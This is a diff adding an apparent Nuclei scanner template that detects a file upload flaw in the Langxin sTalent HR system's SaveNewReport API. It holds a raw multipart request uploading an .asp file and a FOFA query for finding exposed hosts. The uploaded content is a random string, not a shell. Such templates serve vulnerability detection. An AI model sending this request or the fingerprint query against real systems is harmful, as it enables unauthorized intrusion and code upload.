@@ -1,0 +1,43 @@
+id: langxin-SaveNewReport-fileupload
+info:
+  name: 朗新sTalent api/Report/SaveNewReport 文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 北京朗新天霁软件技术有限公司开发的朗新sTalent系统是一款专注于解决跨地域、多层次集团发展过程中人力资源管控、协调性及资源共享问题的系统。该系统的 api/Report/SaveNewReport 接口存在文件上传漏洞，攻击者可通过上传恶意文件实现命令执行，从而获取敏感信息并对系统造成严重威胁。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/qv6f1fzwcad62eld
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: body="/js/Comm/loadingsmall.js" && icon_hash="1772087922"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileupload,langxin
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /api/Report/SaveNewReport?rptId=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=7e14e267b081de44454417c892579161b33a66cefc9023d14918e3be82cf
+
+        --7e14e267b081de44454417c892579161b33a66cefc9023d14918e3be82cf
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.asp"
+        Content-Type: application/octet-stream
+
+        {{randstr}}
+        --7e14e267b081de44454417c892579161b33a66cefc9023d14918e3be82cf--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'message','code')
+        condition: and
